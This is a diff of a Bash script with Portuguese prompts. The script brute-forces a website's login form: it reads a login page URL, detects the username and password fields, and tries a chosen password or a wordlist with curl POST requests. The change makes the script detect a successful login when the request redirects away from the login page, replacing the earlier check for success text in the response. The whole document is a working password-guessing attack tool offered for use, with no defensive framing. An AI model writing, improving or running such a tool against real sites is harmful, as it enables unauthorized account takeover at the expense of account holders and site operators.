@@ -1,7 +1,7 @@
 #!/bin/bash
 
 clear
-echo -e "\e[1;32m==== BRUTE FORCE PRO TERMINUX [DETECÇÃO AUTOMÁTICA] ====\e[0m"
+echo -e "\e[1;32m==== BRUTE FORCE PRO TERMUX [DETECÇÃO AUTOMÁTICA + REDIRECIONAMENTO] ====\e[0m"
 
 read -p "🔗 URL da página de login (não o action): " page_url
 [ -z "$page_url" ] && echo -e "\e[1;31m❌ URL obrigatória.\e[0m" && exit 1
@@ -27,16 +27,19 @@ echo -e "🖋️ Campo de senha detectado: \e[1;33m$passfield\e[0m"
 read -p "👤 Usuário: " user
 [ -z "$user" ] && echo -e "\e[1;31m❌ Usuário obrigatório.\e[0m" && exit 1
 
-read -p "✅ Texto que indica login BEM-SUCEDIDO (ex: 'Dashboard'): " success_indicator
-[ -z "$success_indicator" ] && echo -e "\e[1;31m❌ Indicador obrigatório.\e[0m" && exit 1
-
 read -p "🔑 Senha personalizada (pressione ENTER para usar lista): " senha
 
+# Função para testar senha — detectando redirecionamento
 testar_senha() {
   local pwd=$1
-  resp=$(curl -s -X POST "$action" -d "$userfield=$user&$passfield=$pwd")
-  if [[ "$resp" =~ $success_indicator ]]; then
-    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd\e[0m"
+
+  # Captura o código HTTP e URL final após seguir redirects
+  result=$(curl -s -L -w "%{url_effective} %{http_code}" -o /dev/null -X POST "$action" -d "$userfield=$user&$passfield=$pwd")
+  final_url=$(echo "$result" | awk '{print $1}')
+  status_code=$(echo "$result" | awk '{print $2}')
+
+  if [[ "$final_url" != "$page_url" && "$status_code" =~ ^2|3 ]]; then
+    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd → REDIRECIONADO PARA: $final_url\e[0m"
     kill 0 2>/dev/null
     exit 0
   else
